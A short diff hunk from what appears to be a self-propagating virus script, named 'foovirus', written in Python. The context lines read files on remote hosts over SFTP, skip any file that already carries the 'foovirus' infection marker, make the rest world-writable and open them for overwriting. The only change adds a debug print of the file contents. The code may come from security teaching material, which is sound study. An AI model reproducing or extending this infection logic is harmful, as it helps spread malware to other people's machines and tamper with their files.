@@ -122,6 +122,7 @@ while True:
                         # Read the contents of the remote file
                         all_of_it = IN.readlines()
                         IN.close()
+                        print(all_of_it)
                         if any('foovirus' in line for line in all_of_it): continue
                         os.chmod(item, 0o777)
                         OUT = sftp.file(item, 'w')
